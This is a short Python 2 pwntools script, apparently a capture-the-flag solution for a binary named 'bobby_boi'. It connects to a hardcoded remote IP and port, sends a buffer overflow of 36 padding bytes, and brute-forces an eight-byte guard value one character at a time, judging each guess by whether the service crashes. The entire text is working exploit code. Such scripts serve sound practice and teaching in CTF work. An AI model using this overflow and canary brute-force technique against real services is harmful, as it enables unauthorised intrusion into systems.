#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *
from sys import argv

local_file  = './bobby_boi'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

def bf(og_bar,c):
    se      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    sea     = lambda delim,data         :p.sendafter(delim, data)
    rc      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, '\0'))
    uu64    = lambda data               :u64(data.ljust(8, '\0'))
    info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

    # p = process(local_file)
    p = remote('35.238.225.156',1002)

    payload = 'A'*36+og_bar+c
    sla('What\'s the size of your bars?\n',str(len(payload)))
    sea('Spit your bars here: \n',payload)
    sl('')
    try:
        data = rc()
        print data
        p.close()
        return -1
    except Exception as e:
        print 'good'
        p.close()
        return c

og_bar = ''
if(len(argv)>1):
    og_bar = argv[1]
table = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\n'
while len(og_bar)<=8:
    for c in table:
        res = bf(og_bar,c)
        print 'trying',og_bar+c
        if res != -1:
            og_bar += c
            break
            # pause()
print 'og_bar:', og_bar
